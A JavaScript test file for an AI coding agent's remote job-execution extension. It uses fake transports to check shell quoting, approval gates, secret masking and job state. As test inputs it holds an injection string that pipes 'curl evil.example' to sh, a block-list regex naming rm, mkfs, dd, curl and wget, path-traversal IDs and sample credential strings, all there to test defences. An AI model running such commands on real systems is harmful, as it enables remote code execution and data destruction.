// Targeted tests for .pi/extensions/server/core.mjs + tool wiring in index.ts.
// Fake transport + local native primitives only. No live SSH, no network.
import { equal, ok } from "node:assert";
import { execFile, execFileSync, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import test from "node:test";
import {
	ApprovalStore, BlockedError, ConnectionError, STATUS_COMMAND,
	approvalHash, assertConfigPerms, boundOutput, buildLaunchScript, buildPollScript, buildPrecheckScript,
	buildStopScript, checkTransportBudget, classifyPoll, jobDirFor, maskSecrets, parsePollOutput,
	shQuote, unitFor, JobManager, genJobId, MAX_TRANSPORT_BYTES,
} from "../.pi/extensions/server/core.mjs";

const T = "owner@192.0.2.1"; // TEST-NET-1 documentation address, never the real target
const CORE_URL = pathToFileURL(join(process.cwd(), ".pi/extensions/server/core.mjs")).href;

function mgrWithFake(stateDir, script) {
	const calls = [];
	const runRemote = async (s, _o) => { calls.push(s); return script(s, calls.length); };
	const m = new JobManager({ stateDir, runRemote, target: T });
	return { m, calls };
}
const freshDir = () => mkdtempSync(join(tmpdir(), "piserver-"));
const PRECHECK_OK = { stdout: "PIJOB-OK\nPIJOB-BUS-OK\n", stderr: "", exitCode: 0 };

// Launch fake: extracts the unit id from the script so the receipt check passes.
function launchReceipt(s) {
	const m = s.match(/pi-job-([A-Za-z0-9_-]{16})\.service/);
	const unit = m ? `pi-job-${m[1]}.service` : "pi-job-unknown.service";
	return { stdout: `Running as unit ${unit}\n`, stderr: "", exitCode: 0 };
}
function launchFake(s) {
	if (s.includes("command -v")) return PRECHECK_OK;
	if (s.includes("systemd-run")) return launchReceipt(s);
	throw new Error("unexpected script in launch path");
}

// Fake poll responder: extracts the real per-call token from the generated script
// and interpolates it into a canned transcript (tests real builder + real parser).
function fakePoll({ show, exit, out, err, outSize, errSize }) {
	return async (s) => {
		const m = s.match(/T='(PIJOB-[0-9a-f]+)'/);
		if (!m) throw new Error("poll script missing token");
		const t = m[1];
		const os = outSize ?? Buffer.byteLength(out);
		const es = errSize ?? Buffer.byteLength(err);
		return { stdout: `${t}-SHOW\n${show}${t}-EXIT\n${exit}\n${t}-OUT\n${out}${t}-OUTSIZE\n${os}\n${t}-ERR\n${err}${t}-ERRSIZE\n${es}\n${t}-END\n`, stderr: "", exitCode: 0 };
	};
}

function pollTranscript(token, { show, exit, out, err, outSize, errSize }) {
	const os = outSize ?? Buffer.byteLength(out);
	const es = errSize ?? Buffer.byteLength(err);
	return `${token}-SHOW\n${show}${token}-EXIT\n${exit}\n${token}-OUT\n${out}${token}-OUTSIZE\n${os}\n${token}-ERR\n${err}${token}-ERRSIZE\n${es}\n${token}-END\n`;
}

test("success + nonzero exit via real wrapper parsing", async () => {
	const { m } = mgrWithFake(freshDir(), launchFake);
	// Launch path exercised; now parse a real poll transcript for completed + failed.
	const token = "PIJOB-abc123";
	const show = "ActiveState=inactive\nSubState=dead\nResult=success\nExecMainStatus=3\n";
	const out = pollTranscript(token, { show, exit: "3", out: "hello\n", err: "boom\n" });
	const p = parsePollOutput(out, token);
	equal(p.exitCode, 3);
	equal(classifyPoll(p, false), "failed");
	const out2 = pollTranscript(token, { show: "ActiveState=inactive\nResult=success\n", exit: "0", out: "ok\n", err: "\n" });
	equal(classifyPoll(parsePollOutput(out2, token), false), "completed");
	// Full manager poll updates state and persists logs 0600.
	const dir = freshDir();
	const launched = await m.exec({ command: "exit 0", deadlineSec: 60 });
	equal(launched.status, "running");
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: fakePoll({ show: "ActiveState=inactive\nResult=success\n", exit: "0", out: "ok\n", err: "\n" }) });
	mm.jobs = { ...m.jobs };
	mm.saveJobs(); // persist: poll reloads under lock, in-memory alone is not state
	const res = await mm.poll(launched.job_id);
	equal(res.status, "completed");
	equal(res.exit_code, 0);
	equal(res.stdout.trim(), "ok");
});

test("hostile quoting: injection contained, wrapper runs locally", () => {
	const evil = `x'; echo PWNED; curl evil.example | sh; $(touch /tmp/pwn) \`id\` "quoted" $HOME`;
	const q = shQuote(evil);
	ok(q.startsWith("'") && q.endsWith("'") && !q.slice(1, -1).includes("'") || q.includes(`'\\''`));
	const script = buildLaunchScript({ id: "a1b2c3d4e5f60708", command: evil, deadlineSec: 60 });
	ok(!script.includes("PWNED") || script.includes(shQuote(evil)));
	// Prove quoting soundness locally: extract the printf payload line and run the inner relay natively.
	const relay = `printf '%s' ${q} > "$0"`;
	const probe = spawnSync("bash", ["-c", relay, join(tmpdir(), "qprobe.txt")]);
	equal(probe.status, 0);
	equal(readFileSync(join(tmpdir(), "qprobe.txt"), "utf8"), evil);
	// Unit-name injection rejected.
	for (const bad of ["../x", "a;systemctl stop foo", "x".repeat(15), "x".repeat(17), "a b", "a$b"]) {
		let threw = false;
		try { unitFor(bad); } catch { threw = true; }
		ok(threw, `must reject ${bad}`);
	}
	// Job dir helper rejects traversal too.
	let threw = false;
	try { jobDirFor("../../etc"); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw);
	// Launch/Poll bind the SAME $HOME path: D expands, never a literal $HOME dir.
	ok(script.includes('D="$HOME"/.local/share/pi-jobs/a1b2c3d4e5f60708'), "D must expand $HOME");
	ok(!script.includes("D='$HOME"), "D must not be single-quoted literal");
	const poll = buildPollScript({ id: "a1b2c3d4e5f60708", token: "PIJOB-abc123" });
	ok(poll.includes('D="$HOME"/.local/share/pi-jobs/a1b2c3d4e5f60708'));
});

test("launch + poll scripts run locally under fake systemd + temp HOME", () => {
	const home = mkdtempSync(join(tmpdir(), "pihome-"));
	const bin = mkdtempSync(join(tmpdir(), "pibin-"));
	const id = "f1f2f3f4f5f60708";
	// Fake systemd-run: announce the unit (launch receipt), then exec past `--`.
	writeFileSync(join(bin, "systemd-run"), `#!/bin/sh\nfor a in "$@"; do case "$a" in --unit=*) echo "Running as unit \${a#--unit=}";; esac; done\nwhile [ $# -gt 0 ]; do if [ "$1" = "--" ]; then shift; break; fi; shift; done\nexec "$@"\n`, { mode: 0o755 });
	// Fake systemctl: bus ok; show reports inactive/success once exitcode exists.
	writeFileSync(join(bin, "systemctl"), `#!/bin/sh\nif [ "$1" = "--user" ]; then shift; fi\ncase "$1" in show-environment) exit 0;; show) echo "ActiveState=inactive"; echo "SubState=dead"; echo "Result=success"; exit 0;; stop|kill) exit 0;; *) exit 0;; esac\n`, { mode: 0o755 });
	const env = { ...process.env, HOME: home, PATH: `${bin}:${process.env.PATH}` };
	const pre = execFileSync("bash", ["-c", buildPrecheckScript()], { encoding: "utf8", env });
	ok(pre.includes("PIJOB-OK") && pre.includes("PIJOB-BUS-OK"), `precheck markers: ${pre}`);
	const cmd = `echo hello-out; echo hello-err >&2`;
	const launch = execFileSync("bash", ["-c", buildLaunchScript({ id, command: cmd, deadlineSec: 60 })], { encoding: "utf8", env });
	ok(launch.includes(`pi-job-${id}.service`), `launch receipt: ${launch}`);
	const dir = join(home, ".local", "share", "pi-jobs", id);
	ok(existsSync(join(dir, "cmd")) && existsSync(join(dir, "exitcode")), "remote-layout files exist under temp HOME");
	equal(readFileSync(join(dir, "exitcode"), "utf8"), "0");
	equal(statSync(dir).mode & 0o777, 0o700);
	for (const f of ["cmd", "stdout.log", "stderr.log", "exitcode"]) equal(statSync(join(dir, f)).mode & 0o777, 0o600, f);
	ok(!existsSync(join(process.cwd(), "$HOME")), "no literal $HOME dir leaked into cwd");
	const token = "PIJOB-abc123";
	const pollOut = execFileSync("bash", ["-c", buildPollScript({ id, token })], { encoding: "utf8", env });
	const parsed = parsePollOutput(pollOut, token);
	equal(parsed.exitCode, 0);
	equal(classifyPoll(parsed, false), "completed");
	ok(parsed.stdoutTail.includes("hello-out") && parsed.stderrTail.includes("hello-err"));
	equal(parsed.truncated, false);
});

test("launch failure is blocked, never running", async () => {
	const dir = freshDir();
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("command -v")) return PRECHECK_OK;
		return { stdout: "Failed to start unit\n", stderr: "bus down", exitCode: 1 };
	} });
	const r = await mm.exec({ command: "echo hi", deadlineSec: 60 });
	equal(r.status, "blocked");
	ok(/launch receipt missing/.test(r.note ?? ""));
	equal(mm.jobs[r.job_id].status, "blocked");
});

test("launch receipt in stderr-only still launches", async () => {
	const dir = freshDir();
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("command -v")) return PRECHECK_OK;
		const m = s.match(/pi-job-([A-Za-z0-9_-]{16})\.service/);
		const unit = m ? `pi-job-${m[1]}.service` : "pi-job-unknown.service";
		return { stdout: "", stderr: `Running as unit ${unit}\n`, exitCode: 0 };
	} });
	const r = await mm.exec({ command: "echo hi", deadlineSec: 60 });
	equal(r.status, "running");
	ok(/launched under transient unit/.test(r.note ?? ""));
});

test("precheck requires user bus too", async () => {
	const dir = freshDir();
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async () => ({ stdout: "PIJOB-OK\nPIJOB-NO-BUS\n", stderr: "", exitCode: 0 }) });
	const r = await mm.exec({ command: "echo hi", deadlineSec: 60 });
	equal(r.status, "blocked");
	ok(/user bus/.test(r.note ?? ""));
});

test("unknown on disconnect vs timed_out are distinct", async () => {
	const dir = freshDir();
	const down = async () => { throw new ConnectionError("no route"); };
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: down });
	mm.jobs = { jjjjjjjjjjjjjjjj: { id: "jjjjjjjjjjjjjjjj", target: T, status: "running", startedAt: Date.now(), deadlineSec: 60, locallyStopped: false, exit_code: null, createdAt: 1, endedAt: null } };
	mm.saveJobs();
	const r = await mm.poll("jjjjjjjjjjjjjjjj");
	equal(r.status, "unknown");
	equal(r.remote_known, false);
	equal(mm.jobs["jjjjjjjjjjjjjjjj"].status, "running"); // last-confirmed kept, never auto-rerun
	const token = "PIJOB-t9";
	const tout = pollTranscript(token, { show: "ActiveState=failed\nSubState=failed\nResult=timeout\n", exit: "NONE", out: "", err: "" });
	equal(classifyPoll(parsePollOutput(tout, token), false), "timed_out");
	const gone = pollTranscript(token, { show: "NO-UNIT\n", exit: "NONE", out: "", err: "" });
	equal(classifyPoll(parsePollOutput(gone, token), false), "unknown"); // fail closed, --collect may erase unit
});

test("stop verifies: still-active stays running, dead becomes cancelled", async () => {
	const dir = freshDir();
	// Case A: stop requested but unit still active -> stays running.
	const active = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("systemctl --user stop")) return { stdout: "PIJOB-STOPPED\n", stderr: "", exitCode: 0 };
		return fakePoll({ show: "ActiveState=active\nSubState=running\n", exit: "NONE", out: "", err: "" })(s);
	} });
	active.jobs = { ssssssssssssssss: { id: "ssssssssssssssss", target: T, status: "running", startedAt: Date.now(), deadlineSec: 60, locallyStopped: false, exit_code: null, createdAt: 1, endedAt: null } };
	active.saveJobs();
	const a = await active.stop("ssssssssssssssss");
	equal(a.status, "running");
	ok(/still active/.test(a.note ?? ""));
	equal(active.jobs["ssssssssssssssss"].status, "running");
	// Case B: verified dead -> cancelled.
	const dir2 = freshDir();
	const dead = new JobManager({ stateDir: dir2, target: T, runRemote: async (s) => {
		if (s.includes("systemctl --user stop")) return { stdout: "PIJOB-STOPPED\n", stderr: "", exitCode: 0 };
		return fakePoll({ show: "ActiveState=inactive\nSubState=dead\nResult=success\n", exit: "0", out: "bye\n", err: "" })(s);
	} });
	dead.jobs = { kkkkkkkkkkkkkkkk: { id: "kkkkkkkkkkkkkkkk", target: T, status: "running", startedAt: Date.now(), deadlineSec: 60, locallyStopped: false, exit_code: null, createdAt: 1, endedAt: null } };
	dead.saveJobs();
	const s = await dead.stop("kkkkkkkkkkkkkkkk");
	equal(s.status, "cancelled");
	const s2 = await dead.stop("kkkkkkkkkkkkkkkk");
	equal(s2.status, "cancelled"); // idempotent, no remote rerun
});

test("stop verify unparseable stays unknown, keeps reservation for later poll", async () => {
	const dir = freshDir();
	let valid = false;
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("systemctl --user stop")) return { stdout: "PIJOB-STOPPED\n", stderr: "", exitCode: 0 };
		if (!valid) return { stdout: "GARBAGE-NO-MARKERS\n", stderr: "", exitCode: 0 };
		return fakePoll({ show: "ActiveState=inactive\nResult=success\n", exit: "0", out: "fin\n", err: "" })(s);
	} });
	mm.jobs = { uuuuuuuuuuuuuuuu: { id: "uuuuuuuuuuuuuuuu", target: T, status: "running", startedAt: Date.now(), deadlineSec: 60, locallyStopped: false, exit_code: null, createdAt: 1, endedAt: null } };
	mm.saveJobs();
	const r = await mm.stop("uuuuuuuuuuuuuuuu");
	equal(r.status, "unknown");
	equal(r.remote_known, false);
	equal(mm.jobs["uuuuuuuuuuuuuuuu"].status, "running");
	equal(mm.jobs["uuuuuuuuuuuuuuuu"].locallyStopped, false);
	let threw = false;
	try { await mm.exec({ command: "echo overlap", deadlineSec: 60 }); } catch (e) { threw = /busy/.test(e.message); }
	ok(threw, "busy retained after unparseable stop");
	valid = true;
	const p = await mm.poll("uuuuuuuuuuuuuuuu");
	equal(p.status, "completed");
});

test("local group-kill analogue (NOT proof of remote cgroup kill)", async () => {
	// Honest scope: killing a local setsid group reaps its detached child. The remote
	// KillMode=control-group claim is verified only by stop/poll round trips above.
	const probe = spawnSync("bash", ["-c", "setsid sleep 30 & echo $!"], { encoding: "utf8", timeout: 5000 });
	equal(probe.status, 0);
	const pid = Number((probe.stdout || "").trim());
	ok(Number.isFinite(pid) && pid > 0, "detached pid captured");
	process.kill(pid, 0); // alive before group kill (throws otherwise)
	process.kill(-pid, "SIGKILL"); // setsid => pid is group leader; whole group dies
	let gone = false;
	for (let i = 0; i < 20 && !gone; i++) {
		await new Promise((r) => setTimeout(r, 100));
		try { process.kill(pid, 0); } catch { gone = true; }
	}
	ok(gone, "group kill reaped the detached descendant");
});

test("bounded output + true truncated flag from remote sizes", () => {
	const big = "x".repeat(100 * 1024);
	const b = boundOutput(big);
	ok(b.truncated && Buffer.byteLength(b.text) <= 32 * 1024);
	ok(b.text.endsWith("xxxx")); // tail kept
	const small = boundOutput("hi");
	equal(small.truncated, false);
	// 16KB tail with a larger remote size must report truncated even though local 32KB is not hit.
	const token = "PIJOB-tr1";
	const tail = "y".repeat(100);
	const t = pollTranscript(token, { show: "ActiveState=active\n", exit: "NONE", out: tail, err: "", outSize: 20000, errSize: 0 });
	const p = parsePollOutput(t, token);
	equal(p.truncated, true);
	equal(p.outSize, 20000);
});

test("transport budget caps local buffers", () => {
	checkTransportBudget(0, 10);
	checkTransportBudget(MAX_TRANSPORT_BYTES - 1, 1);
	let threw = false;
	try { checkTransportBudget(0, MAX_TRANSPORT_BYTES + 1); } catch (e) { threw = e instanceof ConnectionError; }
	ok(threw, "over-cap chunk throws ConnectionError");
	threw = false;
	try { checkTransportBudget(MAX_TRANSPORT_BYTES, 1); } catch (e) { threw = e instanceof ConnectionError; }
	ok(threw);
});

test("config perms enforced", () => {
	assertConfigPerms(0o600);
	for (const bad of [0o644, 0o640, 0o666, 0o755]) {
		let threw = false;
		try { assertConfigPerms(bad); } catch (e) { threw = e instanceof BlockedError; }
		ok(threw, `mode ${bad.toString(8)} must be refused`);
	}
});

test("maskTerms are applied to outputs and logs, not just the command", async () => {
	const dir = freshDir();
	const secret = "s3cr3t-xyz-999";
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("command -v")) return PRECHECK_OK;
		if (s.includes("systemd-run")) return launchReceipt(s);
		return fakePoll({ show: "ActiveState=inactive\nResult=success\n", exit: "0", out: `leak ${secret} done\n`, err: "" })(s);
	} });
	const launched = await mm.exec({ command: `echo ${secret}`, deadlineSec: 60, maskTerms: [secret] });
	const r = await mm.poll(launched.job_id);
	ok(!r.stdout.includes(secret), "report output masked");
	ok(readFileSync(join(dir, `${launched.job_id}.stdout.log`), "utf8").includes("[redacted-host]"));
	ok((mm.jobs[launched.job_id].commandMasked ?? "").includes("[redacted-host]"));
});

test("approval: deny/headless/one-shot race + reload fail closed", () => {
	const dir = freshDir();
	const a = new ApprovalStore(dir);
	ok(!a.consume({ command: "reboot", target: T, deadlineSec: 60 })); // headless without approval
	a.approve({ command: "reboot", target: T, maxDeadlineSec: 60 });
	ok(a.consume({ command: "reboot", target: T, deadlineSec: 60 })); // single use
	ok(!a.consume({ command: "reboot", target: T, deadlineSec: 60 })); // race/reuse fails
	a.approve({ command: "echo hi", target: T, maxDeadlineSec: 30 });
	ok(!a.consume({ command: "echo hi", target: T, deadlineSec: 31 })); // deadline bound
	ok(!a.consume({ command: "echo hi ", target: T, deadlineSec: 30 })); // exact-match only
	const b = new ApprovalStore(dir); // reload: used stays used
	ok(!b.consume({ command: "reboot", target: T, deadlineSec: 60 }));
	const c = new ApprovalStore(dir);
	c.approve({ command: "sleep 1", target: T, maxDeadlineSec: 60, ttlMs: 1 });
	ok(!c.consume({ command: "sleep 1", target: T, deadlineSec: 60, now: Date.now() + 60000 })); // expired
	// Cross-target approval never applies.
	a.approve({ command: "id", target: T, maxDeadlineSec: 60 });
	ok(!a.consume({ command: "id", target: "other@host", deadlineSec: 60 }));
	// Validation: empty / oversize / out-of-range approvals rejected, never stored.
	for (const bad of ["", "   "]) {
		let threw = false;
		try { a.approve({ command: bad, target: T, maxDeadlineSec: 60 }); } catch (e) { threw = e instanceof BlockedError; }
		ok(threw, "empty command rejected");
	}
	let threw = false;
	try { a.approve({ command: "x".repeat(17 * 1024), target: T, maxDeadlineSec: 60 }); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw, "oversize command rejected");
	for (const d of [0, 4, 3601, 999999]) {
		threw = false;
		try { a.approve({ command: "echo ok", target: T, maxDeadlineSec: d }); } catch (e) { threw = e instanceof BlockedError; }
		ok(threw, `deadline ${d} rejected`);
	}
});

test("TWO processes: concurrent approval consume yields exactly one winner", async () => {
	const dir = freshDir();
	new ApprovalStore(dir).approve({ command: "reboot", target: T, maxDeadlineSec: 60 });
	const code = `import { ApprovalStore } from ${JSON.stringify(CORE_URL)};`
		+ `const a = new ApprovalStore(${JSON.stringify(dir)});`
		+ `process.stdout.write(a.consume({ command: "reboot", target: ${JSON.stringify(T)}, deadlineSec: 60 }) ? "1" : "0");`;
	const run = () => new Promise((res, rej) => {
		execFile(process.execPath, ["--input-type=module", "-e", code], (e, stdout, stderr) => {
			if (e) rej(new Error(`child failed: ${e.message} ${stderr}`));
			else res(stdout);
		});
	});
	const [r1, r2] = await Promise.all([run(), run()]);
	equal([r1, r2].sort().join(""), "01", `exactly one winner, got ${JSON.stringify([r1, r2])}`);
});

test("TWO processes: busy reservation visible across processes via reload", async () => {
	const dir = freshDir();
	const parent = new JobManager({ stateDir: dir, target: T, runRemote: launchFake });
	const launched = await parent.exec({ command: "sleep 50", deadlineSec: 60 });
	equal(launched.status, "running");
	const code = `import { JobManager, BlockedError } from ${JSON.stringify(CORE_URL)};`
		+ `const m = new JobManager({ stateDir: ${JSON.stringify(dir)}, target: ${JSON.stringify(T)}, runRemote: async () => { throw new Error("must not reach remote"); } });`
		+ `try { await m.exec({ command: "echo overlap", deadlineSec: 60 }); process.stdout.write("OK"); }`
		+ `catch (e) { process.stdout.write(e instanceof BlockedError && /busy/.test(e.message) ? "BUSY" : "OTHER:" + e.message); }`;
	const out = execFileSync(process.execPath, ["--input-type=module", "-e", code], { encoding: "utf8" });
	equal(out, "BUSY", `second process must see busy, got ${out}`);
	// Other target is NOT blocked by this target's reservation.
	const other = new JobManager({ stateDir: dir, target: "other@192.0.2.2", runRemote: launchFake });
	const r = await other.exec({ command: "echo hi", deadlineSec: 60 });
	equal(r.status, "running");
});

test("corrupt registry fails closed in this and other processes", async () => {
	const dir = freshDir();
	const m0 = new JobManager({ stateDir: dir, target: T, runRemote: launchFake });
	const launched = await m0.exec({ command: "sleep 50", deadlineSec: 60 });
	equal(launched.status, "running");
	writeFileSync(join(dir, "jobs.json"), "{corrupt!!!");
	let calls = 0;
	const m1 = new JobManager({ stateDir: dir, target: T, runRemote: async () => { calls++; return { stdout: "", stderr: "", exitCode: 0 }; } });
	ok(m1.jobsCorrupt, "corrupt flagged");
	let threw = false;
	try { await m1.exec({ command: "echo pwn", deadlineSec: 60 }); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw, "new launch blocked after corruption");
	equal(calls, 0, "no remote call after corruption");
	ok(readdirSync(dir).some((f) => f.startsWith("jobs.corrupt.")), "quarantine file kept");
	const code = `import { JobManager, BlockedError } from ${JSON.stringify(CORE_URL)};`
		+ `const m = new JobManager({ stateDir: ${JSON.stringify(dir)}, target: ${JSON.stringify(T)}, runRemote: async () => ({ stdout: "", stderr: "", exitCode: 0 }) });`
		+ `try { await m.exec({ command: "echo pwn", deadlineSec: 60 }); process.stdout.write("OK"); }`
		+ `catch (e) { process.stdout.write(e instanceof BlockedError ? "BLOCKED" : "OTHER"); }`;
	// jobs.json is gone (quarantined); recreate corruption for the child check.
	writeFileSync(join(dir, "jobs.json"), "{corrupt!!!");
	const out = execFileSync(process.execPath, ["--input-type=module", "-e", code], { encoding: "utf8" });
	equal(out, "BLOCKED");
});

test("reload reconciliation: running survives, reconciles without rerun", async () => {
	const dir = freshDir();
	let n = 0;
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		n++;
		if (s.includes("command -v")) return PRECHECK_OK;
		return launchReceipt(s);
	} });
	const launched = await mm.exec({ command: "sleep 50", deadlineSec: 60 });
	equal(n, 2); // precheck + launch, nothing else
	// Simulate manager restart (reload): new instance, same dir, no rerun of command.
	const mm2 = new JobManager({ stateDir: dir, target: T, runRemote: fakePoll({ show: "ActiveState=inactive\nResult=success\n", exit: "0", out: "fin\n", err: "\n" }) });
	equal(mm2.jobs[launched.job_id].status, "running");
	const r = await mm2.poll(launched.job_id);
	equal(r.status, "completed");
	equal(r.stdout.trim(), "fin");
	equal(statSync(join(dir, "jobs.json")).mode & 0o777, 0o600);
});

test("wrong id + concurrent busy", async () => {
	const dir = freshDir();
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => {
		if (s.includes("command -v")) return PRECHECK_OK;
		return launchReceipt(s);
	} });
	let threw = false;
	try { await mm.poll("zzzzzzzzzzzzzzzz"); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw, "unknown id rejected");
	threw = false;
	try { await mm.stop("../../etc/passwd!!"); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw, "malformed id rejected");
	// Cross-target job rejected.
	mm.jobs["cccccccccccccccc"] = { id: "cccccccccccccccc", target: "evil@host", status: "running", startedAt: Date.now(), deadlineSec: 60, locallyStopped: false, exit_code: null, createdAt: 1, endedAt: null };
	mm.saveJobs();
	threw = false;
	try { await mm.poll("cccccccccccccccc"); } catch (e) { threw = e instanceof BlockedError; }
	ok(threw, "cross-target rejected");
	delete mm.jobs["cccccccccccccccc"];
	mm.saveJobs();
	const first = await mm.exec({ command: "sleep 50", deadlineSec: 60 });
	equal(first.status, "running");
	threw = false;
	try { await mm.exec({ command: "echo overlap", deadlineSec: 60 }); } catch (e) { threw = /busy/.test(e.message); }
	ok(threw, "second live command fails busy");
});

test("precheck blocks without systemd (no weaker fallback)", async () => {
	const dir = freshDir();
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async () => ({ stdout: "PIJOB-NO-SYSTEMD\nPIJOB-NO-BUS\n", stderr: "", exitCode: 0 }) });
	const r = await mm.exec({ command: "echo hi", deadlineSec: 60 });
	equal(r.status, "blocked");
});

test("status command is fixed read-only + secrets masked everywhere", async () => {
	ok(!/\brm\b|\breboot\b|\bshutdown\b|\bmkfs\b|\bdd\b|\bcurl\b|\bwget\b/.test(STATUS_COMMAND));
	const dir = freshDir();
	let seen = "";
	const mm = new JobManager({ stateDir: dir, target: T, runRemote: async (s) => { seen = s; return { stdout: `up ${T} ghp_abcdef1234567890 AKIAIOSFODNN7EXAMPLE`, stderr: "", exitCode: 0 }; } });
	const r = await mm.runStatus();
	equal(seen, STATUS_COMMAND); // exact fixed command, nothing agent-supplied
	ok(!r.stdout.includes(T) && r.stdout.includes("[redacted-host]"));
	ok(!r.stdout.includes("ghp_abcdef") && !r.stdout.includes("AKIAIOSFODNN7EXAMPLE"));
	const m2 = maskSecrets(`user ${T} -----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY----- password: s3cret!`, [T]);
	ok(!m2.includes("PRIVATE KEY-----\nabc") && m2.includes("[redacted-private-key]") && m2.includes("password=[redacted]"));
	// hash binds target+command exactly.
	ok(approvalHash(T, "a") !== approvalHash(T, "a ") && approvalHash(T, "a") !== approvalHash("u", "a"));
	// Generated ids always valid.
	for (let i = 0; i < 20; i++) ok(/^[A-Za-z0-9_-]{16}$/.test(genJobId()));
	// Private state dir is 0700 (jobs.json asserted 0600 after an exec persists it).
	const st = statSync(dir);
	equal(st.mode & 0o777, 0o700);
});

test("tool wiring: index.ts registers server tool + approve command (fake pi)", async () => {
	// Point HOME at an empty dir BEFORE import: index.ts binds config/state paths at module scope.
	const fakeHome = mkdtempSync(join(tmpdir(), "pifakehome-"));
	process.env.HOME = fakeHome;
	// ESM ignores NODE_PATH, so probe a copy of index.ts with bare specifiers
	// rewritten to the installed Pi package files (stdlib-only, no new deps).
	const piLib = "/usr/local/lib/node_modules/@earendil-works/pi-coding-agent/node_modules";
	const coreAbs = new URL("file://" + join(process.cwd(), ".pi/extensions/server/core.mjs")).href;
	let src = readFileSync(join(process.cwd(), ".pi/extensions/server/index.ts"), "utf8");
	src = src.replace('"@earendil-works/pi-ai"', JSON.stringify(piLib + "/@earendil-works/pi-ai/dist/index.js"));
	src = src.replace('"typebox"', JSON.stringify(piLib + "/typebox/build/index.mjs"));
	src = src.replace('"./core.mjs"', JSON.stringify(coreAbs));
	const probe = join(tmpdir(), `server-index-probe-${Date.now()}.mts`);
	writeFileSync(probe, src, { mode: 0o600 });
	const mod = await import(pathToFileURL(probe).href);
	const tools = {}, commands = {};
	const fakePi = {
		registerTool: (t) => { tools[t.name] = t; },
		registerCommand: (n, c) => { commands[n] = c; },
	};
	mod.default(fakePi);
	ok(tools.server && commands["server-approve"]);
	const uiCalls = [];
	const ctxNoUI = { hasUI: false, ui: { confirm: async () => { uiCalls.push(1); return true; } } };
	let threw = null, result = null;
	try {
		result = await tools.server.execute("id1", { action: "server_status" }, undefined, () => {}, ctxNoUI);
	} catch (e) { threw = e; }
	// Empty fake HOME => no private config => BlockedError, never any network/spawn.
	ok(threw instanceof BlockedError, `expected BlockedError, got ${threw}`);
	equal(result, null);
	equal(uiCalls.length, 0); // headless path never prompts
	// Headless exec without approval returns approval_required (no approved=true bypass exists).
	// Cannot reach exec without config, so assert schema: no `approved` param in tool definition.
	ok(!("approved" in tools.server.parameters.properties));
	// Group/other-readable private config is refused, not silently used.
	const cfgDir = join(fakeHome, ".pi", "agent");
	mkdirSync(cfgDir, { recursive: true });
	writeFileSync(join(cfgDir, "server-ssh.json"), JSON.stringify({ user: "u", host: "h" }), { mode: 0o600 });
	chmodSync(join(cfgDir, "server-ssh.json"), 0o644);
	threw = null;
	try {
		await tools.server.execute("id2", { action: "server_status" }, undefined, () => {}, ctxNoUI);
	} catch (e) { threw = e; }
	ok(threw instanceof BlockedError && /0600/.test(threw.message), `expected 0600 BlockedError, got ${threw}`);
	// Approve handler rejects empty/oversize/out-of-range instead of persisting junk.
	const notes = [];
	const approveCtx = { ui: { notify: (m) => notes.push(String(m)) } };
	// Valid config perms first so loadConfig passes.
	chmodSync(join(cfgDir, "server-ssh.json"), 0o600);
	await commands["server-approve"].handler("   ", approveCtx);
	ok(notes.some((n) => /Usage|rejected/i.test(n)), `empty approve must not persist: ${notes}`);
});

test("autoApproveExec true skips TUI confirm + headless approval gate (no SSH)", async () => {
	const fakeHome = mkdtempSync(join(tmpdir(), "pifakehome-auto-"));
	process.env.HOME = fakeHome;
	const piLib = "/usr/local/lib/node_modules/@earendil-works/pi-coding-agent/node_modules";
	const coreAbs = new URL("file://" + join(process.cwd(), ".pi/extensions/server/core.mjs")).href;
	let src = readFileSync(join(process.cwd(), ".pi/extensions/server/index.ts"), "utf8");
	src = src.replace('"@earendil-works/pi-ai"', JSON.stringify(piLib + "/@earendil-works/pi-ai/dist/index.js"));
	src = src.replace('"typebox"', JSON.stringify(piLib + "/typebox/build/index.mjs"));
	src = src.replace('"./core.mjs"', JSON.stringify(coreAbs));
	const probe = join(tmpdir(), `server-index-probe-auto-${Date.now()}.mts`);
	writeFileSync(probe, src, { mode: 0o600 });
	const mod = await import(pathToFileURL(probe).href);
	const tools = {};
	mod.default({ registerTool: (t) => { tools[t.name] = t; }, registerCommand: () => {} });
	const cfgDir = join(fakeHome, ".pi", "agent");
	mkdirSync(cfgDir, { recursive: true });
	// Unknown keys must be ignored, not rejected.
	writeFileSync(join(cfgDir, "server-ssh.json"), JSON.stringify({ user: "u", host: "h", autoApproveExec: true, bogusFutureKey: 123 }), { mode: 0o600 });
	// Empty command never reaches SSH: with the gate skipped it fails validation as blocked.
	const headless = await tools.server.execute("a1", { action: "server_exec", command: "" }, undefined, () => {}, { hasUI: false, ui: {} });
	equal(headless.details.status, "blocked", `auto-approve must skip approval gate, got ${JSON.stringify(headless.details)}`);
	// TUI path must not prompt either.
	let confirms = 0;
	const tui = await tools.server.execute("a2", { action: "server_exec", command: "" }, undefined, () => {}, { hasUI: true, ui: { confirm: async () => { confirms++; return false; } } });
	equal(tui.details.status, "blocked", `auto-approve TUI must skip confirm, got ${JSON.stringify(tui.details)}`);
	equal(confirms, 0, "confirm must not be called when autoApproveExec is true");
});

test("autoApproveExec absent keeps headless approval_required (no SSH)", async () => {
